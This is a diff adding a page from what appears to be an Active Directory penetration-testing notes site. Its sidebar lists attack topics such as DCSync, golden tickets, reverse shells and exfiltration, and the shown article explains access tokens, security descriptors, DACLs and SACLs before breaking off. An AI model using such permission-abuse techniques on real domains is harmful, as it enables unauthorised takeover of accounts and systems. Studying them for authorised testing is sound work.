@@ -1,0 +1,3133 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Permissions Abuse · AD Pentest Notes</title>
+<meta name="description" content="DACL/SACL abuse: GenericAll, GenericWrite, WriteDACL, WriteOwner, OU &amp; GPO abuse.">
+<link rel="preconnect" href="https://cdnjs.cloudflare.com">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<button class="menu-toggle" id="menuToggle" aria-label="Menu">☰</button>
+<div class="layout">
+<nav class="side-nav" id="sideNav">
+<a class="brand" href="index.html"><span class="brand-mark">AD</span><span class="brand-txt">Active Directory<br><small>Pentest Notes</small></span></a>
+<div class="nav-search"><input type="text" id="navSearch" placeholder="Search all notes…  (press /)" autocomplete="off"><div id="searchResults" class="search-results"></div></div>
+<a class="nav-home" href="index.html">🏠 Overview</a>
+<a class="nav-home" href="search.html">🔎 Full-text search</a>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>📘 Things To Understand Prior</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="00_things-to-understand-prior.html#ad-components">AD Components</a></li>
+<li><a href="00_things-to-understand-prior.html#active-directory-components">🧱 Active Directory Components</a></li>
+<li><a href="00_things-to-understand-prior.html#active-directory-structure">Active Directory Structure</a></li>
+<li><a href="00_things-to-understand-prior.html#example-of-domain-and-forest.">Example of Domain and Forest.</a></li>
+<li><a href="00_things-to-understand-prior.html#ad-authentication">AD Authentication</a></li>
+<li><a href="00_things-to-understand-prior.html#kerberos-authentication">Kerberos Authentication</a></li>
+<li><a href="00_things-to-understand-prior.html#step-by-step-kerberos-authentication">🔁 Step-by-Step Kerberos Authentication</a></li>
+<li><a href="00_things-to-understand-prior.html#pac-privilege-attribute-certificate">PAC (Privilege Attribute Certificate)</a></li>
+<li><a href="00_things-to-understand-prior.html#sam-security-system">Sam Security &amp;amp; System</a></li>
+<li><a href="00_things-to-understand-prior.html#lssas-lsa">Lssas &amp;amp; LSA</a></li>
+<li><a href="00_things-to-understand-prior.html#ntds.dit">NTDS.dit</a></li>
+<li><a href="00_things-to-understand-prior.html#dpapi-credential-manager">Dpapi ( Credential Manager )</a></li>
+<li><a href="00_things-to-understand-prior.html#ekeys">Ekeys</a></li>
+<li><a href="00_things-to-understand-prior.html#a.-pass-the-key-kerberos">✔ A. Pass-The-Key (Kerberos)</a></li>
+<li><a href="00_things-to-understand-prior.html#b.-pass-the-hash-ntlm">✔ B. Pass-The-Hash (NTLM)</a></li>
+<li><a href="00_things-to-understand-prior.html#c.-silver-ticket-forging">✔ C. Silver Ticket Forging</a></li>
+<li><a href="00_things-to-understand-prior.html#d.-persistence">✔ D. Persistence</a></li>
+<li><a href="00_things-to-understand-prior.html#rid-enumeration-deep-dive-core-logic-brute-force-working-user-enumeration">🔥 RID Enumeration — Deep Dive (Core Logic + Brute Force Working) + User Enumeration</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>⚔️ Attacks + Lateral Movement</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="01_attacks-lateral-movement.html#bloodhound">BloodHound</a></li>
+<li><a href="01_attacks-lateral-movement.html#local-admin-hunting">Local Admin Hunting</a></li>
+<li><a href="01_attacks-lateral-movement.html#llmnrnbt-ns-poisoning">LLMNR/NBT-NS Poisoning</a></li>
+<li><a href="01_attacks-lateral-movement.html#objective">🔍 Objective</a></li>
+<li><a href="01_attacks-lateral-movement.html#overview">🧭 Overview</a></li>
+<li><a href="01_attacks-lateral-movement.html#purpose-of-llmnrnbt-ns">📦 Purpose of LLMNR/NBT-NS</a></li>
+<li><a href="01_attacks-lateral-movement.html#llmnr---link-local-multicast-name-resolution">🔗 LLMNR - Link-Local Multicast Name Resolution</a></li>
+<li><a href="01_attacks-lateral-movement.html#nbt-ns---netbios-name-service">📛 NBT-NS - NetBIOS Name Service</a></li>
+<li><a href="01_attacks-lateral-movement.html#security-flaw-in-both-protocols">🚨 Security Flaw in Both Protocols</a></li>
+<li><a href="01_attacks-lateral-movement.html#real-world-exploitation-workflow">🎯 Real-World Exploitation Workflow</a></li>
+<li><a href="01_attacks-lateral-movement.html#differences-between-llmnr-nbt-ns">🧠 Differences Between LLMNR &amp;amp; NBT-NS</a></li>
+<li><a href="01_attacks-lateral-movement.html#quick-example-llmnrnbt-ns-poisoning-flow-with-responder">🧪 Quick Example – LLMNR/NBT-NS Poisoning Flow (with Responder)</a></li>
+<li><a href="01_attacks-lateral-movement.html#summary-table">🧾 Summary Table</a></li>
+<li><a href="01_attacks-lateral-movement.html#defense-tips">🛡️ Defense Tips</a></li>
+<li><a href="01_attacks-lateral-movement.html#attack-flow-example">🧪 Attack Flow Example</a></li>
+<li><a href="01_attacks-lateral-movement.html#tools-used">🛠️ Tools Used</a></li>
+<li><a href="01_attacks-lateral-movement.html#responder-options-and-usage">⚙️ Responder Options and Usage</a></li>
+<li><a href="01_attacks-lateral-movement.html#responder-output-log-files">📁 Responder Output: Log Files</a></li>
+<li><a href="01_attacks-lateral-movement.html#cracking-captured-ntlmv2-hash-with-hashcat">🔓 Cracking Captured NTLMv2 Hash with Hashcat</a></li>
+<li><a href="01_attacks-lateral-movement.html#required-open-ports-on-attacker-system-for-responder">🧨 Required Open Ports on Attacker System (for Responder)</a></li>
+<li><a href="01_attacks-lateral-movement.html#use-cases-after-cracking-hashes">🪪 Use Cases After Cracking Hashes</a></li>
+<li><a href="01_attacks-lateral-movement.html#tips">🧠 Tips</a></li>
+<li><a href="01_attacks-lateral-movement.html#recap-of-flow">🔄 Recap of Flow</a></li>
+<li><a href="01_attacks-lateral-movement.html#attack-workflow-windows-inveigh-based-llmnrnbt-ns-poisoning">🚩 Attack Workflow (Windows Inveigh-Based LLMNR/NBT-NS Poisoning)</a></li>
+<li><a href="01_attacks-lateral-movement.html#sample-output-of-c-inveigh-cli-based">🧮 Sample Output of C# Inveigh (CLI-based)</a></li>
+<li><a href="01_attacks-lateral-movement.html#post-capture-actions">🧑‍💻 Post-Capture Actions</a></li>
+<li><a href="01_attacks-lateral-movement.html#remediation-mitigation">🔐 Remediation &amp;amp; Mitigation</a></li>
+<li><a href="01_attacks-lateral-movement.html#smb-ntml-relay-attacks">SMB / NTML Relay Attacks</a></li>
+<li><a href="01_attacks-lateral-movement.html#as-rep-roasting">AS-REP Roasting</a></li>
+<li><a href="01_attacks-lateral-movement.html#kerberoasting">Kerberoasting</a></li>
+<li><a href="01_attacks-lateral-movement.html#dcsync">DCSync</a></li>
+<li><a href="01_attacks-lateral-movement.html#pass-the-hash">Pass The Hash</a></li>
+<li><a href="01_attacks-lateral-movement.html#pass-the-ticket">Pass The Ticket</a></li>
+<li><a href="01_attacks-lateral-movement.html#pass-the-certificate">Pass The Certificate</a></li>
+<li><a href="01_attacks-lateral-movement.html#priv-esc---across-domain-trusts---ad-cs">Priv Esc - Across domain trusts - AD CS</a></li>
+<li><a href="01_attacks-lateral-movement.html#what-is-certify">🔧 What is Certify?</a></li>
+<li><a href="01_attacks-lateral-movement.html#summary-of-escalation-techniques-used">🔐 Summary of Escalation Techniques Used</a></li>
+<li><a href="01_attacks-lateral-movement.html#background-ad-cs-cross-domain-trust">🔥 BACKGROUND: AD CS + Cross-Domain Trust</a></li>
+<li><a href="01_attacks-lateral-movement.html#esc3-exploiting-certificate-request-agent-misconfiguration">🔓 ESC3 — Exploiting Certificate Request Agent Misconfiguration</a></li>
+<li><a href="01_attacks-lateral-movement.html#escalation-to-enterprise-admin-ea-same-concept">🔥 Escalation to Enterprise Admin (EA) (Same concept)</a></li>
+<li><a href="01_attacks-lateral-movement.html#esc1-enrollee-supplies-subject-misconfiguration">🔥 ESC1 — Enrollee Supplies Subject Misconfiguration</a></li>
+<li><a href="01_attacks-lateral-movement.html#step-by-step-guide">🧭 Step-by-Step Guide</a></li>
+<li><a href="01_attacks-lateral-movement.html#shadow-key-credentials-attack">Shadow Key Credentials Attack</a></li>
+<li><a href="01_attacks-lateral-movement.html#gmsa">GMSA</a></li>
+<li><a href="01_attacks-lateral-movement.html#laps">LAPS</a></li>
+<li><a href="01_attacks-lateral-movement.html#where-is-the-laps-password-stored-1">💻 Where is the LAPS Password Stored?</a></li>
+<li><a href="01_attacks-lateral-movement.html#as-an-attacker-why-you-care">🔍 As an Attacker: Why You Care</a></li>
+<li><a href="01_attacks-lateral-movement.html#how-to-enumerate-laps">🧪 How to Enumerate LAPS</a></li>
+<li><a href="01_attacks-lateral-movement.html#unconstrained-delegation">Unconstrained Delegation</a></li>
+<li><a href="01_attacks-lateral-movement.html#constrained-delegation">Constrained Delegation</a></li>
+<li><a href="01_attacks-lateral-movement.html#what-the-kdc-checks">What the KDC Checks</a></li>
+<li><a href="01_attacks-lateral-movement.html#enumeration-of-constrained-delegation">🔍 Enumeration of Constrained Delegation</a></li>
+<li><a href="01_attacks-lateral-movement.html#exploiting-with-rubeus">🧪 Exploiting with Rubeus</a></li>
+<li><a href="01_attacks-lateral-movement.html#bonus-abuse-via-alternate-services-altservice">⚠️ Bonus: Abuse via Alternate Services (altservice)</a></li>
+<li><a href="01_attacks-lateral-movement.html#defensive-notes">🔐 Defensive Notes</a></li>
+<li><a href="01_attacks-lateral-movement.html#rbcd">RBCD</a></li>
+<li><a href="01_attacks-lateral-movement.html#conditions-to-perform-the-attack">Conditions to Perform the Attack</a></li>
+<li><a href="01_attacks-lateral-movement.html#step-2-s4u2proxy-second-hop">6️⃣ Step 2: S4U2Proxy (Second Hop)</a></li>
+<li><a href="01_attacks-lateral-movement.html#rodc-golden-ticket-keylist-attack---extra">RODC = Golden Ticket + Keylist Attack - Extra</a></li>
+<li><a href="01_attacks-lateral-movement.html#root-cause">🔑 Root Cause</a></li>
+<li><a href="01_attacks-lateral-movement.html#trust-is-controlled-by">❗ Trust is Controlled By:</a></li>
+<li><a href="01_attacks-lateral-movement.html#you-broke-the-model-by">🔥 You Broke the Model By:</a></li>
+<li><a href="01_attacks-lateral-movement.html#bad-successor-dmsa-abuse">Bad Successor ( dMSA Abuse )</a></li>
+<li><a href="01_attacks-lateral-movement.html#reality">Reality</a></li>
+<li><a href="01_attacks-lateral-movement.html#these-accounts-usually-have">These Accounts Usually Have</a></li>
+<li><a href="01_attacks-lateral-movement.html#msa">MSA</a></li>
+<li><a href="01_attacks-lateral-movement.html#gmsa-1">gMSA</a></li>
+<li><a href="01_attacks-lateral-movement.html#dmsa">dMSA</a></li>
+</ul></div>
+<div class="nav-group open">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🔑 Permissions Abuse</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="02_permissions-abuse.html#dacl-sacl">DACL &amp;amp; SACL</a></li>
+<li><a href="02_permissions-abuse.html#genericwrite">🔐 GenericWrite</a></li>
+<li><a href="02_permissions-abuse.html#generic-all">Generic All</a></li>
+<li><a href="02_permissions-abuse.html#write-dacl">Write DACL</a></li>
+<li><a href="02_permissions-abuse.html#all-extended-rights">All Extended Rights</a></li>
+<li><a href="02_permissions-abuse.html#write-owner">Write Owner</a></li>
+<li><a href="02_permissions-abuse.html#ou-abuse">OU Abuse</a></li>
+<li><a href="02_permissions-abuse.html#genericall-write-on-ou">GenericAll / Write on OU</a></li>
+<li><a href="02_permissions-abuse.html#gpo-abuse">GPO Abuse</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🔒 Persistence</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="03_persistence.html#golden-ticket-attack">Golden Ticket Attack</a></li>
+<li><a href="03_persistence.html#how-the-golden-ticket-attack-works-step-by-step">🔧 How the Golden Ticket Attack Works (Step-by-Step)</a></li>
+<li><a href="03_persistence.html#what-if-we-impersonate-a-non-existing-user">What if we impersonate a non-existing user?</a></li>
+<li><a href="03_persistence.html#step-1-obtain-the-krbtgt-hash">🔑 Step 1 — Obtain the krbtgt Hash</a></li>
+<li><a href="03_persistence.html#method-1-using-dcsync-most-common">Method 1 — Using DCSync (Most Common)</a></li>
+<li><a href="03_persistence.html#diamond-ticket-attack">Diamond Ticket Attack</a></li>
+<li><a href="03_persistence.html#sliver-ticket-attack">Sliver Ticket Attack</a></li>
+<li><a href="03_persistence.html#what-is-a-silver-ticket-attack">🚀 What is a Silver Ticket Attack?</a></li>
+<li><a href="03_persistence.html#step-by-step-exploitation">⚔️ Step-by-Step Exploitation</a></li>
+<li><a href="03_persistence.html#difference-between-golden-silver-diamond">Difference Between Golden Silver &amp;amp; Diamond</a></li>
+<li><a href="03_persistence.html#persistence-using-acl--adminsdholder---domain-persistence">Persistence using ACL -AdminSDHolder - Domain Persistence</a></li>
+<li><a href="03_persistence.html#dsrm-attack---domain-persistence">DSRM Attack - Domain Persistence</a></li>
+<li><a href="03_persistence.html#skeleton-key-attack">Skeleton Key Attack</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🌲 Forest privilege escalation / trust abuse technique</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#golden-ticket-attack-sid-prime-attack">Golden Ticket Attack + SID Prime Attack</a></li>
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#extra-sid-attack">Extra Sid Attack</a></li>
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#alternative-golden-ticket-via-rubeus">🧪 Alternative: Golden Ticket via Rubeus</a></li>
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#step-8-dcsync-from-parent-domain-privilege-confirm">📤 Step 8: DCSync from Parent Domain (Privilege Confirm)</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🖥️ TI interne</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="05_ti-interne.html#ère-étape-découverte-réseau">1ère étape – Découverte réseau</a></li>
+<li><a href="05_ti-interne.html#bloodhound">BloodHound</a></li>
+<li><a href="05_ti-interne.html#enum-acl">Enum ACL</a></li>
+<li><a href="05_ti-interne.html#énumération-ldap">Énumération LDAP</a></li>
+<li><a href="05_ti-interne.html#domain-computers-abus-machineaccountquota">Domain computers (abus MachineAccountQuota)</a></li>
+<li><a href="05_ti-interne.html#ipc-null-session-enumération-sid">IPC$ / null session → enumération SID</a></li>
+<li><a href="05_ti-interne.html#kerberoasting-aveugle-blind-kerberoast">Kerberoasting aveugle (blind kerberoast)</a></li>
+<li><a href="05_ti-interne.html#exploit-krb5.keytab">Exploit krb5.keytab</a></li>
+<li><a href="05_ti-interne.html#force-change-password">Force Change Password</a></li>
+<li><a href="05_ti-interne.html#generic-all-abus-complet-sur-un-objet">Generic All (abus complet sur un objet)</a></li>
+<li><a href="05_ti-interne.html#genericwrite-targeted-kerberoast-shadow-credentials">GenericWrite → Targeted Kerberoast / Shadow Credentials</a></li>
+<li><a href="05_ti-interne.html#backup-operators-locally">Backup Operators (locally)</a></li>
+<li><a href="05_ti-interne.html#templates-ad-cs-rappel">Templates AD CS (rappel)</a></li>
+<li><a href="05_ti-interne.html#ad-cs-énumération-et-exploitation-esc1-esc8">AD CS – Énumération et exploitation (ESC1 → ESC8)</a></li>
+<li><a href="05_ti-interne.html#gpo-abuse-privilege-escalation">GPO Abuse – Privilege Escalation</a></li>
+<li><a href="05_ti-interne.html#pass-the-hash-pth">Pass the Hash (PtH)</a></li>
+<li><a href="05_ti-interne.html#psexec">PSExec</a></li>
+<li><a href="05_ti-interne.html#smb-sans-signature-relais">SMB sans signature (relais)</a></li>
+<li><a href="05_ti-interne.html#ntlm-theft">NTLM theft</a></li>
+<li><a href="05_ti-interne.html#password-spraying-ntlm-http">Password Spraying (NTLM HTTP)</a></li>
+<li><a href="05_ti-interne.html#reverse-shell-windows-msfvenom-smb">Reverse shell Windows (msfvenom + SMB)</a></li>
+<li><a href="05_ti-interne.html#exfiltration-canaux-variés">Exfiltration (canaux variés)</a></li>
+<li><a href="05_ti-interne.html#évasion-av-powercat-download-cradle">Évasion AV (powercat / download-cradle)</a></li>
+<li><a href="05_ti-interne.html#génération-de-listes-dutilisateurs">Génération de listes d’utilisateurs</a></li>
+<li><a href="05_ti-interne.html#windows-privesc-résumé-des-vecteurs">Windows PrivEsc (résumé des vecteurs)</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🌐 Pentest web</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="06_pentest-web.html#énumération">Énumération</a></li>
+<li><a href="06_pentest-web.html#apache-2.4.49-path-traversal-rce-cve-2021-41773">Apache 2.4.49 – Path Traversal / RCE (CVE-2021-41773)</a></li>
+<li><a href="06_pentest-web.html#php-wrappers-lfi">PHP wrappers / LFI</a></li>
+<li><a href="06_pentest-web.html#tomcat-war-reverse-shell">Tomcat – WAR reverse shell</a></li>
+<li><a href="06_pentest-web.html#bypass-auth-brute-force">Bypass auth – Brute force</a></li>
+<li><a href="06_pentest-web.html#cms">CMS</a></li>
+<li><a href="06_pentest-web.html#code-injection-payloads">Code injection – Payloads</a></li>
+<li><a href="06_pentest-web.html#ssti">SSTI</a></li>
+<li><a href="06_pentest-web.html#sql-injection">SQL Injection</a></li>
+<li><a href="06_pentest-web.html#nosql-injection">NoSQL Injection</a></li>
+<li><a href="06_pentest-web.html#xxe">XXE</a></li>
+<li><a href="06_pentest-web.html#xss">XSS</a></li>
+<li><a href="06_pentest-web.html#csrf-payloads">CSRF – Payloads</a></li>
+<li><a href="06_pentest-web.html#node.js-reverse-shell-deserialization">Node.js – Reverse shell (deserialization)</a></li>
+<li><a href="06_pentest-web.html#php-hmac">PHP – HMAC</a></li>
+<li><a href="06_pentest-web.html#docker-registry-enumération-via-curl">Docker registry – Enumération via curl</a></li>
+<li><a href="06_pentest-web.html#outils">Outils</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>☁️ Cloud &amp; K8s</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="07_cloud-k8s.html#docker-bases">Docker (bases)</a></li>
+<li><a href="07_cloud-k8s.html#kubernetes-kube">Kubernetes (Kube)</a></li>
+<li><a href="07_cloud-k8s.html#azure-cli-devops">Azure CLI (DevOps)</a></li>
+<li><a href="07_cloud-k8s.html#scénarios-dattaque-azure-devops-ci-cd">Scénarios d’attaque Azure DevOps / CI-CD</a></li>
+<li><a href="07_cloud-k8s.html#terraform-state-file-prise-de-contrôle-pipeline-study-case">Terraform state file → prise de contrôle pipeline (study case)</a></li>
+<li><a href="07_cloud-k8s.html#détection-de-vulnérabilités-iac-checkov-terra">Détection de vulnérabilités IaC (Checkov / Terra)</a></li>
+<li><a href="07_cloud-k8s.html#llm-prompt-injection">LLM (prompt injection)</a></li>
+<li><a href="07_cloud-k8s.html#owasp-top-10-cicd-security-risks">OWASP Top 10 CI/CD Security Risks</a></li>
+<li><a href="07_cloud-k8s.html#outils-daudit-k8s-cloud">Outils d’audit K8s / Cloud</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🧰 Priv escalation &amp; Tools</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="08_privesc-tools.html#linux-privesc">Linux PrivEsc</a></li>
+<li><a href="08_privesc-tools.html#reverse-shells">Reverse shells</a></li>
+<li><a href="08_privesc-tools.html#upgrade-shell-tty">Upgrade shell (TTY)</a></li>
+<li><a href="08_privesc-tools.html#pivoting-rpivot">Pivoting (rpivot)</a></li>
+<li><a href="08_privesc-tools.html#port-knocking">Port knocking</a></li>
+<li><a href="08_privesc-tools.html#python-jail-escape">Python jail escape</a></li>
+<li><a href="08_privesc-tools.html#insecure-deserialization-php">Insecure deserialization (PHP)</a></li>
+<li><a href="08_privesc-tools.html#bypass-command-line-obfuscation">Bypass command line (obfuscation)</a></li>
+<li><a href="08_privesc-tools.html#john-the-ripper">John the Ripper</a></li>
+<li><a href="08_privesc-tools.html#tls">TLS</a></li>
+<li><a href="08_privesc-tools.html#wayback-recon-passif">Wayback / recon passif</a></li>
+<li><a href="08_privesc-tools.html#google-dorks-extraits">Google Dorks (extraits)</a></li>
+<li><a href="08_privesc-tools.html#boîte-à-outils-tools">Boîte à outils (TOOLS)</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>✅ Web Vulnerability Checklist</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="09_web-vuln-checklist.html#fa-bypass">2FA Bypass</a></li>
+<li><a href="09_web-vuln-checklist.html#bypass">403 Bypass</a></li>
+<li><a href="09_web-vuln-checklist.html#account-takeover-ato">Account Takeover (ATO)</a></li>
+<li><a href="09_web-vuln-checklist.html#admin-panel">Admin panel</a></li>
+<li><a href="09_web-vuln-checklist.html#aem-adobe-experience-manager">AEM (Adobe Experience Manager)</a></li>
+<li><a href="09_web-vuln-checklist.html#api-authentication-authorization">API Authentication / Authorization</a></li>
+<li><a href="09_web-vuln-checklist.html#authentication">Authentication</a></li>
+<li><a href="09_web-vuln-checklist.html#business-logic">Business Logic</a></li>
+<li><a href="09_web-vuln-checklist.html#cookie-attacks">Cookie Attacks</a></li>
+<li><a href="09_web-vuln-checklist.html#csrf">CSRF</a></li>
+<li><a href="09_web-vuln-checklist.html#exif-geolocation">EXIF / Geolocation</a></li>
+<li><a href="09_web-vuln-checklist.html#file-upload">File Upload</a></li>
+<li><a href="09_web-vuln-checklist.html#django-symfony">Django / Symfony</a></li>
+<li><a href="09_web-vuln-checklist.html#idor">IDOR</a></li>
+<li><a href="09_web-vuln-checklist.html#jira">Jira</a></li>
+<li><a href="09_web-vuln-checklist.html#mass-assignment">Mass Assignment</a></li>
+<li><a href="09_web-vuln-checklist.html#rate-limit-bypass">Rate limit bypass</a></li>
+<li><a href="09_web-vuln-checklist.html#rce-chaînes">RCE (chaînes)</a></li>
+<li><a href="09_web-vuln-checklist.html#register">Register</a></li>
+<li><a href="09_web-vuln-checklist.html#reset-password">Reset password</a></li>
+<li><a href="09_web-vuln-checklist.html#rxss">RXSS</a></li>
+<li><a href="09_web-vuln-checklist.html#sql-injection-payloads">SQL injection (payloads)</a></li>
+<li><a href="09_web-vuln-checklist.html#tips-twitterveille">Tips (Twitter/veille)</a></li>
+</ul></div>
+</nav>
+<main class="content">
+
+<div class="page-head">
+  <div class="crumb"><a href="index.html">Notes</a> ›</div>
+  <h1 class="page-title">🔑 Permissions Abuse</h1>
+  <p class="page-desc">DACL/SACL abuse: GenericAll, GenericWrite, WriteDACL, WriteOwner, OU &amp; GPO abuse.</p>
+</div>
+<div class="article-wrap">
+  <article class="article"><h1 id="permissions-abuse">Permissions Abuse</h1>
+<h2 id="dacl-sacl">DACL &amp; SACL</h2>
+<h4 id="access-control-model-in-active-directory">🔐 <strong>Access Control Model in Active Directory</strong></h4>
+<p>The <strong>Access Control Model</strong> defines <strong>who can access what</strong> in the Active Directory environment. It is a <strong>security mechanism</strong> that governs how <strong>subjects (like users or processes)</strong> interact with <strong>objects (like files, folders, AD objects, or resources)</strong> based on <strong>security information</strong>.</p>
+<p>This model is implemented using the following key components:</p>
+<hr />
+<h4 id="access-tokens">🧾 <strong>1. Access Tokens</strong></h4>
+<p>An <strong>Access Token</strong> is created <strong>when a user logs in</strong>. It represents the <strong>security context</strong> of the user or process and contains important information that determines what the user/process is allowed to do.</p>
+<h4 id="contents-of-an-access-token">✅ <strong>Contents of an Access Token:</strong></h4>
+<ul>
+<li><p><strong>User SID</strong> (Security Identifier)</p></li>
+<li><p><strong>Group SIDs</strong> (all groups the user is a member of)</p></li>
+<li><p><strong>Privileges</strong> (like the ability to shut down the system or back up files)</p></li>
+<li><p><strong>Default DACL</strong> (used when the user creates new objects)</p></li>
+</ul>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<h4 id="usage">🔄 <strong>Usage:</strong></h4>
+<p>Whenever a <strong>user tries to access a resource</strong>, their <strong>access token is compared to the Security Descriptor</strong> of the object they are trying to access.</p>
+<hr />
+<h4 id="security-descriptors">🛡️ <strong>2. Security Descriptors</strong></h4>
+<p>A <strong>Security Descriptor (SD)</strong> is a data structure <strong>attached to each object</strong> in Active Directory (and other securable resources). It defines <strong>who owns the object</strong>, <strong>who can access it</strong>, and <strong>how that access is audited</strong>.</p>
+<blockquote>
+<p><strong>Any object(resource or service) that Windows wants to protect with permissions has a Security Descriptor. Eg:- File system, Registry, Services, Active Directory objects, event logs, printers, etc.</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<h4 id="key-components-of-a-security-descriptor">🔍 <strong>Key components of a Security Descriptor:</strong></h4>
+<div class="line-block">Component | Description |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>Owner SID</strong> | The SID of the user or group that owns the object |</div>
+<div class="line-block"><strong>DACL (Discretionary Access Control List)</strong> | Defines <strong>who has what type of access</strong> to the object (Read, Write, Full Control, etc.) |</div>
+<div class="line-block"><strong>SACL (System Access Control List)</strong> | Defines what <strong>access attempts should be logged</strong> for auditing purposes |</div>
+<h4 id="dacl-discretionary-access-control-list">📋 <strong>3. DACL (Discretionary Access Control List)</strong></h4>
+<p>The <strong>DACL</strong> contains <strong>Access Control Entries (ACEs)</strong> that define <strong>permissions</strong> for users or groups.</p>
+<h4 id="each-ace-includes">🧱 Each ACE includes:</h4>
+<ul>
+<li><p>A <strong>SID</strong> (the user or group)</p></li>
+<li><p>A set of <strong>permissions</strong> (e.g., Read, Write, Modify)</p></li>
+<li><p>A flag indicating whether the access is <strong>allowed</strong> or <strong>denied</strong></p></li>
+</ul>
+<blockquote>
+<p>❗ If there is no DACL, the object is unprotected, and any user can access it.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<hr />
+<h4 id="sacl-system-access-control-list">🔍 <strong>4. SACL (System Access Control List)</strong></h4>
+<p>The <strong>SACL</strong> is used for <strong>auditing access</strong> to objects. It specifies <strong>which operations</strong> on the object should be logged in the <strong>Security Event Log</strong>.</p>
+<p>For example:</p>
+<ul>
+<li><p>Audit <strong>success</strong> or <strong>failure</strong> of access attempts.</p></li>
+<li><p>Used by <strong>Windows Auditing</strong> and <strong>Advanced Threat Detection</strong> tools.</p></li>
+</ul>
+<hr />
+<h4 id="how-it-all-works-together">⚙️ <strong>How It All Works Together</strong></h4>
+<ol type="1">
+<li><p>A <strong>user logs in</strong> → Windows creates an <strong>Access Token</strong>.</p></li>
+<li><p>The user tries to access an <strong>Active Directory object</strong> (like a user account or GPO).</p></li>
+<li><p>Windows checks the <strong>Security Descriptor</strong> of the object:</p>
+<ul>
+<li>Compares the user’s <strong>Access Token</strong> (SIDs + privileges)</li>
+<li>With the object’s <strong>DACL</strong></li>
+</ul></li>
+<li><p>If access is allowed → user can proceed.</p></li>
+<li><p>If the <strong>SACL</strong> has rules for that type of access → the attempt is logged.</p></li>
+</ol>
+<hr />
+<h4 id="example-scenario">🧠 <strong>Example Scenario</strong></h4>
+<p>A user “Alice” logs into her domain-joined PC. She wants to <strong>read a file stored on a shared drive</strong>:</p>
+<ul>
+<li><p>Her <strong>Access Token</strong> includes her <strong>user SID</strong> and group memberships like <code>Domain Users</code>.</p></li>
+<li><p>The file has a <strong>Security Descriptor</strong>:</p>
+<ul>
+<li><strong>Owner:</strong> IT Admin</li>
+<li><strong>DACL:</strong> Grants read access to <code>Domain Users</code></li>
+<li><strong>SACL:</strong> Logs read access by any user</li>
+</ul></li>
+<li><p>Result:</p>
+<ul>
+<li>Alice can read the file (because <code>Domain Users</code> are allowed).</li>
+<li>The read attempt is <strong>audited</strong> because of the SACL.</li>
+</ul></li>
+</ul>
+<hr />
+<h4 id="in-summary">📌 <strong>In Summary</strong></h4>
+<div class="line-block">Component | Purpose |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>Access Token</strong> | Defines <strong>who</strong> is trying to access (SID, groups, privileges) |</div>
+<div class="line-block"><strong>Security Descriptor</strong> | Defines <strong>what</strong> access is allowed and <strong>who</strong> owns the object |</div>
+<div class="line-block"><strong>DACL</strong> | Controls <strong>access permissions</strong> (Allow/Deny) |</div>
+<div class="line-block"><strong>SACL</strong> | Controls <strong>auditing and logging</strong> of access attempts |</div>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<h4 id="key-components-in-the-diagram">🧱 <strong>Key Components in the Diagram</strong></h4>
+<p>✅ <strong>Object</strong></p>
+<p>This is the <strong>resource</strong> (e.g., file, folder, AD object) that someone is trying to access.</p>
+<h4 id="dacl-discretionary-access-control-list-1">🛡️ <strong>DACL (Discretionary Access Control List)</strong></h4>
+<p>Attached to the object. It contains <strong>Access Control Entries (ACEs)</strong> that define <strong>who can or cannot access</strong> the object and <strong>what type of access</strong> is allowed or denied.</p>
+<p><strong>✅ Subjects</strong></p>
+<p>This contains users, groups or process trying to access the object(resource). Above example contains two treads Tread A and Tread B. Each Tread contains certain set of users or groups</p>
+<h4 id="thread-a-andrew-tries-to-access-the-object">🔒 <strong>Thread A (Andrew) Tries to Access the Object</strong></h4>
+<p>When a user from Tread A, lets say Andrew tries to access the object with its access token, he is passed through DACL, <strong>ACE 1</strong> matches Andrew directly and says “Access Denied”. Deny takes precedence that means the user will know not be passed further.</p>
+<ol type="1">
